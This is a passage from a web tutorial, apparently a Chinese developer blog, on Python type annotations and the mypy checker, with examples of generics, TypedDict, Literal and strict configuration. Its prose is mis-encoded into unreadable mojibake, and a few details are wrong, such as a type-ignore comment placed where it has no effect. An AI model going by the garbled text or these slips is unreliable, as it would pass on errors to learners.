li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä½ æœ‰æ²¡æœ‰é‡åˆ°è¿‡è¿™ç§æƒ…å†µï¼šå‡½æ•°è¿”å›å€¼ç±»å‹ä¸å¯¹ï¼Œè·‘äº†ä¸€æ™šä¸Šæ‰å‘ç°é—®é¢˜ï¼›æˆ–è€…æ¥æ‰‹è€ä»£ç ï¼Œçœ‹åˆ°ä¸€å †å‚æ•°å®Œå…¨ä¸çŸ¥é“ä¼ ä»€ä¹ˆç±»å‹ï¼›åˆæˆ–è€…æ˜æ˜ä¼ äº†ä¸ªå­—ç¬¦ä¸²ï¼Œä»£ç å´æœŸæœ›æ˜¯ä¸ªå­—å…¸ã€‚</p>
<p>ç„¶åä½ ç™¾åº¦äº†ä¸€åœˆï¼ŒStack Overflowç¿»äº†ä¸‰é¡µï¼Œæœ€åå‘ç°ï¼šåŸæ¥Pythonä¹Ÿèƒ½å†™ç±»å‹æ³¨è§£ï¼</p>
<p>ä»Šå¤©å’±ä»¬å°±æ¥å½»åº•ææ‡‚è¿™ä¸ªè®©ä»£ç å¥å£®å¦‚é’¢é“ä¾ çš„ç¥å™¨ã€‚</p>
<h2 data-id="heading-0">ä»€ä¹ˆæ˜¯ç±»å‹æ³¨è§£ï¼Ÿåˆ«è¢«"ç±»å‹"ä¿©å­—å“åˆ°</h2>
<p>è¯´ç™½äº†ï¼Œç±»å‹æ³¨è§£å°±æ˜¯ç»™å˜é‡å’Œå‡½æ•°è´´æ ‡ç­¾ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ä»¥å‰æˆ‘ä»¬è¿™ä¹ˆå†™ï¼ˆè£¸å¥”çŠ¶æ€ï¼‰</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a, b</span>):
    <span class="hljs-keyword">return</span> a + b

<span class="hljs-comment"># ç°åœ¨æˆ‘ä»¬è¿™ä¹ˆå†™ï¼ˆç©¿ä¸Šè¡£æœï¼‰</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a: <span class="hljs-built_in">int</span>, b: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">int</span>:
    <span class="hljs-keyword">return</span> a + b
</code></pre>
<p>çœ‹åˆ°æ²¡ï¼Ÿ<code>: int</code> å°±æ˜¯å‘Šè¯‰ç¨‹åºå‘˜ï¼š"è¿™é‡Œè¦æ•´æ•°"ï¼Œ<code>-&gt; int</code> æ˜¯è¯´ï¼š"è¿™é‡Œè¿”å›æ•´æ•°"ã€‚</p>
<p><strong>ä½†æ˜¯é‡ç‚¹æ¥äº†ï¼šPythonè§£é‡Šå™¨æ ¹æœ¬ä¸é¸Ÿè¿™äº›æ³¨è§£ï¼</strong></p>
<p>ä½ å†™äº†ç±»å‹æ³¨è§£ï¼Œä½†ä¼ ä¸ªå­—ç¬¦ä¸²è¿›å»ï¼Œä»£ç ç…§æ ·è·‘ï¼ˆç›´åˆ°è¿è¡Œæ—¶å‡ºé”™ï¼‰ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a: <span class="hljs-built_in">int</span>, b: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">int</span>:
    <span class="hljs-keyword">return</span> a + b

result = add(<span class="hljs-string">"hello"</span>, <span class="hljs-string">"world"</span>)  <span class="hljs-comment"># è¿”å› "helloworld"ï¼Œè§£é‡Šå™¨æ¯«æ— æ€¨è¨€</span>
</code></pre>
<p>è¿™æ—¶å€™å°±éœ€è¦ <strong>mypy</strong> å‡ºåœºäº†ï¼</p>
<h2 data-id="heading-1">mypyï¼šPythonçš„é™æ€ç±»å‹æ£€æŸ¥å™¨</h2>
<p>mypyå°±åƒä½ ä»£ç çš„ä¿é•–ï¼Œåœ¨ä»£ç è¿è¡Œå‰å°±å¸®ä½ æŠŠæ½œåœ¨é—®é¢˜æªå‡ºæ¥ï¼š</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">å®‰è£…mypyï¼ˆPython 3.9+ï¼‰</span>
python3 -m pip install mypy
<span class="hljs-meta prompt_">
# </span><span class="bash">æ£€æŸ¥ä½ çš„ä»£ç </span>
mypy your_file.py
</code></pre>
<p>è¿˜æ˜¯åˆšæ‰é‚£ä¸ªä¾‹å­ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># test.py</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a: <span class="hljs-built_in">int</span>, b: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">int</span>:
    <span class="hljs-keyword">return</span> a + b

result = add(<span class="hljs-string">"hello"</span>, <span class="hljs-string">"world"</span>)  <span class="hljs-comment"># è¿™é‡Œä¼šæŠ¥é”™ï¼</span>
</code></pre>
<p>è¿è¡Œmypyæ£€æŸ¥ï¼š</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_">$ </span><span class="bash">mypy test.py</span>
error: Argument 1 to "add" has incompatible type "str"; expected "int"
error: Argument 2 to "add" has incompatible type "str"; expected "int"
Found 2 errors in 1 file (checked 1 source file)
</code></pre>
<p>çœ‹åˆ°äº†å—ï¼Ÿ<strong>ä¸ç”¨è¿è¡Œä»£ç ï¼Œmypyå°±èƒ½å‘ç°ç±»å‹é”™è¯¯ï¼</strong></p>
<p>è¿™å°±æ˜¯ä¸ºä»€ä¹ˆå¤§å‚éƒ½åœ¨ç”¨mypyçš„åŸå› ï¼š<strong>æŠŠbugæ‰¼æ€åœ¨æ‘‡ç¯®é‡Œ</strong>ã€‚</p>
<h2 data-id="heading-2">å¸¸ç”¨ç±»å‹æ³¨è§£è¯­æ³•å¤§å…¨</h2>
<h3 data-id="heading-3">åŸºç¡€ç±»å‹</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># åŸºæœ¬ç±»å‹</span>
name: <span class="hljs-built_in">str</span> = <span class="hljs-string">"å¼ ä¸‰"</span>
age: <span class="hljs-built_in">int</span> = <span class="hljs-number">25</span>
height: <span class="hljs-built_in">float</span> = <span class="hljs-number">1.75</span>
is_student: <span class="hljs-built_in">bool</span> = <span class="hljs-literal">True</span>

<span class="hljs-comment"># é›†åˆç±»å‹</span>
scores: <span class="hljs-built_in">list</span>[<span class="hljs-built_in">int</span>] = [<span class="hljs-number">90</span>, <span class="hljs-number">85</span>, <span class="hljs-number">88</span>]  <span class="hljs-comment"># Python 3.9+ å†™æ³•</span>
scores: <span class="hljs-type">List</span>[<span class="hljs-built_in">int</span>] = [<span class="hljs-number">90</span>, <span class="hljs-number">85</span>, <span class="hljs-number">88</span>]  <span class="hljs-comment"># è€ç‰ˆæœ¬å†™æ³•ï¼ˆéœ€è¦from typing import Listï¼‰</span>

<span class="hljs-comment"># å­—å…¸ç±»å‹</span>
student_info: <span class="hljs-built_in">dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-built_in">str</span>] = {<span class="hljs-string">"name"</span>: <span class="hljs-string">"å¼ ä¸‰"</span>, <span class="hljs-string">"class"</span>: <span class="hljs-string">"ä¸‰å¹´çº§äºŒç­"</span>}
student_info: <span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-built_in">str</span>] = {<span class="hljs-string">"name"</span>: <span class="hljs-string">"å¼ ä¸‰"</span>, <span class="hljs-string">"class"</span>: <span class="hljs-string">"ä¸‰å¹´çº§äºŒç­"</span>}

<span class="hljs-comment"># å¯é€‰ç±»å‹ï¼ˆå¯èƒ½ä¸ºNoneï¼‰</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_user_name</span>(<span class="hljs-params">user_id: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">str</span> | <span class="hljs-literal">None</span>:  <span class="hljs-comment"># Python 3.10+</span>
    <span class="hljs-keyword">if</span> user_id == <span class="hljs-number">0</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">"ç”¨æˆ·"</span> + <span class="hljs-built_in">str</span>(user_id)

<span class="hljs-comment"># è€ç‰ˆæœ¬å†™æ³•</span>
<span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Optional</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_user_name</span>(<span class="hljs-params">user_id: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-type">Optional</span>[<span class="hljs-built_in">str</span>]:
    <span class="hljs-keyword">if</span> user_id == <span class="hljs-number">0</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">"ç”¨æˆ·"</span> + <span class="hljs-built_in">str</span>(user_id)
</code></pre>
<h3 data-id="heading-4">å‡½æ•°ç±»å‹æ³¨è§£</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Callable</span>

<span class="hljs-comment"># å‡½æ•°ä½œä¸ºå‚æ•°</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">process_data</span>(<span class="hljs-params">data: <span class="hljs-built_in">list</span>[<span class="hljs-built_in">int</span>], processor: <span class="hljs-type">Callable</span>[[<span class="hljs-built_in">int</span>], <span class="hljs-built_in">str</span>]</span>) -&gt; <span class="hljs-built_in">list</span>[<span class="hljs-built_in">str</span>]:
    <span class="hljs-keyword">return</span> [processor(item) <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> data]

<span class="hljs-keyword">def</span> <span class="hljs-title function_">to_string</span>(<span class="hljs-params">num: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">str</span>:
    <span class="hljs-keyword">return</span> <span class="hljs-string">f"æ•°å­—ï¼š<span class="hljs-subst">{num}</span>"</span>

result = process_data([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>], to_string)  <span class="hljs-comment"># ["æ•°å­—ï¼š1", "æ•°å­—ï¼š2", "æ•°å­—ï¼š3"]</span>
</code></pre>
<h3 data-id="heading-5">ç±»çš„ç±»å‹æ³¨è§£</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name: <span class="hljs-built_in">str</span>, age: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-literal">None</span>:
        self.name = name
        self.age = age

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_info</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">str</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">f"<span class="hljs-subst">{self.name}</span>, <span class="hljs-subst">{self.age}</span>å²"</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">have_birthday</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:
        self.age += <span class="hljs-number">1</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">create_user</span>() -&gt; User:
    <span class="hljs-keyword">return</span> User(<span class="hljs-string">"æå››"</span>, <span class="hljs-number">30</span>)
</code></pre>
<h2 data-id="heading-6">mypyè¿›é˜¶ç©æ³•</h2>
<h3 data-id="heading-7">ä¸¥æ ¼æ¨¡å¼</h3>
<p>æƒ³è®©mypyæ›´ä¸¥æ ¼ï¼ŸåŠ ä¸Šè¿™äº›å‚æ•°ï¼š</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">æœ€ä¸¥æ ¼çš„æ£€æŸ¥</span>
mypy --strict your_file.py
<span class="hljs-meta prompt_">
# </span><span class="bash">å¸¸ç”¨ä¸¥æ ¼é€‰é¡¹</span>
mypy --disallow-untyped-defs --disallow-incomplete-defs your_file.py
</code></pre>
<h3 data-id="heading-8">é…ç½®æ–‡ä»¶</h3>
<p>åˆ›å»º <code>mypy.ini</code> æ–‡ä»¶ï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-section">[mypy]</span>
<span class="hljs-attr">python_version</span> = <span class="hljs-number">3.9</span>
<span class="hljs-attr">warn_return_any</span> = <span class="hljs-literal">True</span>
<span class="hljs-attr">warn_unused_configs</span> = <span class="hljs-literal">True</span>
<span class="hljs-attr">disallow_untyped_defs</span> = <span class="hljs-literal">True</span>
<span class="hljs-attr">disallow_incomplete_defs</span> = <span class="hljs-literal">True</span>
<span class="hljs-attr">check_untyped_defs</span> = <span class="hljs-literal">True</span>
<span class="hljs-attr">disallow_untyped_decorators</span> = <span class="hljs-literal">True</span>
<span class="hljs-attr">no_implicit_optional</span> = <span class="hljs-literal">True</span>
<span class="hljs-attr">warn_redundant_casts</span> = <span class="hljs-literal">True</span>
<span class="hljs-attr">warn_unused_ignores</span> = <span class="hljs-literal">True</span>
<span class="hljs-attr">warn_no_return</span> = <span class="hljs-literal">True</span>
<span class="hljs-attr">warn_unreachable</span> = <span class="hljs-literal">True</span>
<span class="hljs-attr">strict_equality</span> = <span class="hljs-literal">True</span>
</code></pre>
<h3 data-id="heading-9">å¿½ç•¥ç‰¹å®šé”™è¯¯</h3>
<p>æœ‰æ—¶å€™myPyå¤ªä¸¥æ ¼ï¼Œå¯ä»¥ä¸´æ—¶å¿½ç•¥ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">legacy_function</span>(<span class="hljs-params">param</span>):  <span class="hljs-comment"># type: ignore</span>
    <span class="hljs-comment"># è¿™ä¸ªè€ä»£ç æš‚æ—¶ä¸æƒ³æ”¹ç±»å‹æ³¨è§£</span>
    <span class="hljs-keyword">return</span> param * <span class="hljs-number">2</span>
</code></pre>
<p>æˆ–è€…å¿½ç•¥ç‰¹å®šé”™è¯¯ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">tricky_function</span>(<span class="hljs-params">data: <span class="hljs-built_in">dict</span></span>) -&gt; <span class="hljs-built_in">str</span>:
    <span class="hljs-comment"># type: ignore[<span class="hljs-keyword">return</span>-value]  # å¿½ç•¥è¿”å›å€¼ç±»å‹æ£€æŸ¥</span>
    <span class="hljs-keyword">return</span> data.get(<span class="hljs-string">"key"</span>, <span class="hljs-string">""</span>)
</code></pre>
<h2 data-id="heading-10">å®æˆ˜åœºæ™¯ï¼šä»€ä¹ˆæ—¶å€™ç”¨ç±»å‹æ³¨è§£ï¼Ÿ</h2>
<h3 data-id="heading-11">âœ… å»ºè®®ä½¿ç”¨çš„åœºæ™¯</h3>
<ol>
<li><strong>å¤§å‹é¡¹ç›®</strong>ï¼šä»£ç è¶Šå¤šï¼Œç±»å‹æ³¨è§£è¶Šæœ‰ç”¨</li>
<li><strong>å›¢é˜Ÿåä½œ</strong>ï¼šåˆ«äººèƒ½å¿«é€Ÿçœ‹æ‡‚ä½ çš„ä»£ç </li>
<li><strong>APIæ¥å£</strong>ï¼šæ˜ç¡®è¾“å…¥è¾“å‡ºç±»å‹</li>
<li><strong>æ ¸å¿ƒä¸šåŠ¡é€»è¾‘</strong>ï¼šå‡å°‘bugï¼Œæé«˜å¯é æ€§</li>
<li><strong>å¼€æºé¡¹ç›®</strong>ï¼šè®©è´¡çŒ®è€…æ›´å®¹æ˜“ç†è§£ä»£ç </li>
</ol>
<h3 data-id="heading-12">âŒ å¯ä»¥ä¸ç”¨çš„åœºæ™¯</h3>
<ol>
<li><strong>å¿«é€ŸåŸå‹éªŒè¯</strong>ï¼šå†™è„šæœ¬æµ‹è¯•æƒ³æ³•</li>
<li><strong>ç®€å•çš„ä¸€æ¬¡æ€§è„šæœ¬</strong>ï¼šå‡ åè¡Œä»£ç è€Œå·²</li>
<li><strong>æ•°æ®ç§‘å­¦æ¢ç´¢</strong>ï¼šJupyter notebooké‡Œè·‘æ•°æ®åˆ†æ</li>
</ol>
<h3 data-id="heading-13">ğŸ¤” éœ€è¦æƒè¡¡çš„åœºæ™¯</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æ•°æ®å¤„ç†ï¼šè¦ä¸è¦åŠ ç±»å‹æ³¨è§£ï¼Ÿ</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">process_data</span>(<span class="hljs-params">data</span>):  <span class="hljs-comment"># æ•°æ®å¯èƒ½æ˜¯list, tuple, numpy array...</span>
    <span class="hljs-comment"># ç®€å•åœºæ™¯ï¼šä¸åŠ æ³¨è§£æ›´çµæ´»</span>
    <span class="hljs-keyword">return</span> [x * <span class="hljs-number">2</span> <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> data]

<span class="hljs-comment"># å¤æ‚åœºæ™¯ï¼šåŠ ä¸Šæ³¨è§£æ›´æ¸…æ™°</span>
<span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Union</span>, <span class="hljs-type">List</span>
<span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np

<span class="hljs-keyword">def</span> <span class="hljs-title function_">process_data</span>(<span class="hljs-params">data: <span class="hljs-type">Union</span>[<span class="hljs-type">List</span>[<span class="hljs-built_in">float</span>], np.ndarray]</span>) -&gt; np.ndarray:
    <span class="hljs-comment"># æ˜ç¡®å¤„ç†é€»è¾‘ï¼ŒmyPyèƒ½å¸®å¿™æ£€æŸ¥</span>
    <span class="hljs-keyword">return</span> np.array(data) * <span class="hljs-number">2</span>
</code></pre>
<h2 data-id="heading-14">è¸©å‘æŒ‡å—ï¼šmyPyå¸¸è§é”™è¯¯</h2>
<h3 data-id="heading-15">1. ç¬¬ä¸‰æ–¹åº“æ²¡æœ‰ç±»å‹æ³¨è§£</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> requests

<span class="hljs-comment"># myPyä¼šæŠ¥é”™ï¼šLibrary does not support type checking</span>
response = requests.get(<span class="hljs-string">"https://api.example.com"</span>)
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># å®‰è£…ç±»å‹å­˜æ ¹æ–‡ä»¶</span>
pip install types-requests

<span class="hljs-comment"># æˆ–è€…åœ¨é…ç½®æ–‡ä»¶ä¸­å¿½ç•¥</span>
<span class="hljs-comment"># mypy.ini</span>
[mypy-requests.*]
ignore_missing_imports = <span class="hljs-literal">True</span>
</code></pre>
<h3 data-id="heading-16">2. åŠ¨æ€å±æ€§è®¿é—®</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, data: <span class="hljs-built_in">dict</span></span>):
        <span class="hljs-keyword">for</span> key, value <span class="hljs-keyword">in</span> data.items():
            <span class="hljs-built_in">setattr</span>(self, key, value)  <span class="hljs-comment"># myPyä¸è®¤è¯†åŠ¨æ€å±æ€§</span>

user = User({<span class="hljs-string">"name"</span>: <span class="hljs-string">"å¼ ä¸‰"</span>, <span class="hljs-string">"age"</span>: <span class="hljs-number">25</span>})
<span class="hljs-built_in">print</span>(user.name)  <span class="hljs-comment"># myPyæŠ¥é”™ï¼šUser has no attribute "name"</span>
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Any</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, data: <span class="hljs-built_in">dict</span></span>):
        <span class="hljs-keyword">for</span> key, value <span class="hljs-keyword">in</span> data.items():
            <span class="hljs-built_in">setattr</span>(self, key, value)

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__getattr__</span>(<span class="hljs-params">self, name: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-type">Any</span>:
        <span class="hljs-comment"># è®©myPyçŸ¥é“è¿™ä¸ªç±»å¯èƒ½æœ‰å¾ˆå¤šå±æ€§</span>
        <span class="hljs-keyword">return</span> self.__dict__.get(name)
</code></pre>
<h3 data-id="heading-17">3. å­—å…¸é”®å€¼ç±»å‹æ¨æ–­</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_user_data</span>() -&gt; <span class="hljs-built_in">dict</span>:
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"name"</span>: <span class="hljs-string">"å¼ ä¸‰"</span>, <span class="hljs-string">"age"</span>: <span class="hljs-number">25</span>}

user = get_user_data()
<span class="hljs-built_in">print</span>(user[<span class="hljs-string">"name"</span>])  <span class="hljs-comment"># myPyä¸çŸ¥é“è¿™ä¸ªé”®å­˜åœ¨</span>
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> TypedDict

<span class="hljs-keyword">class</span> <span class="hljs-title class_">UserData</span>(<span class="hljs-title class_ inherited__">TypedDict</span>):
    name: <span class="hljs-built_in">str</span>
    age: <span class="hljs-built_in">int</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_user_data</span>() -&gt; UserData:
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"name"</span>: <span class="hljs-string">"å¼ ä¸‰"</span>, <span class="hljs-string">"age"</span>: <span class="hljs-number">25</span>}

user = get_user_data()
<span class="hljs-built_in">print</span>(user[<span class="hljs-string">"name"</span>])  <span class="hljs-comment"># myPyçŸ¥é“è¿™ä¸ªé”®ä¸€å®šå­˜åœ¨ï¼</span>
</code></pre>
<h2 data-id="heading-18">é«˜çº§æŠ€å·§ï¼šè®©ç±»å‹æ³¨è§£æ›´å¥½ç”¨</h2>
<h3 data-id="heading-19">1. æ³›å‹å‡½æ•°</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> TypeVar, <span class="hljs-type">List</span>

T = TypeVar(<span class="hljs-string">'T'</span>)  <span class="hljs-comment"># æ³›å‹ç±»å‹å˜é‡</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_first_item</span>(<span class="hljs-params">items: <span class="hljs-type">List</span>[T]</span>) -&gt; T:
    <span class="hljs-keyword">return</span> items[<span class="hljs-number">0</span>]

<span class="hljs-comment"># myPyèƒ½æ¨æ–­å‡ºæ­£ç¡®çš„è¿”å›ç±»å‹</span>
numbers = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]
first_num = get_first_item(numbers)  <span class="hljs-comment"># ç±»å‹æ˜¯int</span>

strings = [<span class="hljs-string">"a"</span>, <span class="hljs-string">"b"</span>, <span class="hljs-string">"c"</span>]
first_str = get_first_item(strings)  <span class="hljs-comment"># ç±»å‹æ˜¯str</span>
</code></pre>
<h3 data-id="heading-20">2. è”åˆç±»å‹</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Union</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">process_id</span>(<span class="hljs-params">user_id: <span class="hljs-type">Union</span>[<span class="hljs-built_in">int</span>, <span class="hljs-built_in">str</span>]</span>) -&gt; <span class="hljs-built_in">str</span>:
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(user_id, <span class="hljs-built_in">int</span>):
        <span class="hljs-keyword">return</span> <span class="hljs-string">f"ID: <span class="hljs-subst">{user_id}</span>"</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">f"Username: <span class="hljs-subst">{user_id}</span>"</span>

<span class="hljs-comment"># Python 3.10+ æ›´ç®€æ´çš„å†™æ³•</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">process_id</span>(<span class="hljs-params">user_id: <span class="hljs-built_in">int</span> | <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(user_id, <span class="hljs-built_in">int</span>):
        <span class="hljs-keyword">return</span> <span class="hljs-string">f"ID: <span class="hljs-subst">{user_id}</span>"</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">f"Username: <span class="hljs-subst">{user_id}</span>"</span>
</code></pre>
<h3 data-id="heading-21">3. å­—é¢é‡ç±»å‹</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Literal</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">set_status</span>(<span class="hljs-params">status: <span class="hljs-type">Literal</span>[<span class="hljs-string">"pending"</span>, <span class="hljs-string">"success"</span>, <span class="hljs-string">"error"</span>]</span>) -&gt; <span class="hljs-literal">None</span>:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Status: <span class="hljs-subst">{status}</span>"</span>)

set_status(<span class="hljs-string">"pending"</span>)  <span class="hljs-comment"># âœ… æ­£ç¡®</span>
set_status(<span class="hljs-string">"failed"</span>)   <span class="hljs-comment"># âŒ myPyæŠ¥é”™ï¼šä¸æ˜¯é¢„æœŸçš„å€¼</span>
</code></pre>
<h2 data-id="heading-22">æ€§èƒ½å½±å“ï¼šç±»å‹æ³¨è§£ä¼šè®©ä»£ç å˜æ…¢å—ï¼Ÿ</h2>
<p><strong>ç­”æ¡ˆï¼šä¸ä¼šï¼</strong></p>
<p>è®°ä½ï¼šPythonè§£é‡Šå™¨ä¼š<strong>å¿½ç•¥</strong>ç±»å‹æ³¨è§£ã€‚å®ƒä»¬åœ¨è¿è¡Œæ—¶å°±æ˜¯æ™®é€šçš„æ³¨é‡Šã€‚</p>
<p>ä½†æ˜¯ç±»å‹æ³¨è§£æœ¬èº«ä¼šå ç”¨ä¸€ç‚¹å†…å­˜ï¼Œä¸è¿‡è¿™ç‚¹å¼€é”€å¯ä»¥å¿½ç•¥ä¸è®¡ã€‚</p>
<p><strong>çœŸæ­£çš„å¥½å¤„æ˜¯ï¼š</strong></p>
<ol>
<li><strong>IDEæ›´æ™ºèƒ½</strong>ï¼šè‡ªåŠ¨è¡¥å…¨ã€å‚æ•°æç¤ºæ›´å‡†ç¡®</li>
<li><strong>é‡æ„æ›´å®‰å…¨</strong>ï¼šæ”¹å‡½æ•°åæ—¶ï¼ŒmyPyä¼šæ£€æŸ¥æ‰€æœ‰è°ƒç”¨ç‚¹</li>
<li><strong>æ–‡æ¡£æ›´æ¸…æ™°</strong>ï¼šç±»å‹å°±æ˜¯æœ€å¥½çš„æ–‡æ¡£</li>
</ol>
<h2 data-id="heading-23">ä»0åˆ°1ï¼šåœ¨ç°æœ‰é¡¹ç›®ä¸­å¼•å…¥mypy</h2>
<h3 data-id="heading-24">ç¬¬ä¸€æ­¥ï¼šå°èŒƒå›´è¯•ç‚¹</h3>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">å…ˆæ£€æŸ¥ä¸€ä¸ªæ–‡ä»¶</span>
mypy utils.py
<span class="hljs-meta prompt_">
# </span><span class="bash">æˆ–è€…æ£€æŸ¥æŸä¸ªç›®å½•</span>
mypy src/utils/
</code></pre>
<h3 data-id="heading-25">ç¬¬äºŒæ­¥ï¼šé€æ­¥ä¿®å¤</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ä»ç®€å•å¼€å§‹</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a, b</span>):  <span class="hljs-comment"># æ²¡æœ‰ç±»å‹æ³¨è§£</span>
    <span class="hljs-keyword">return</span> a + b

<span class="hljs-comment"># åŠ ä¸ŠåŸºæœ¬æ³¨è§£</span>
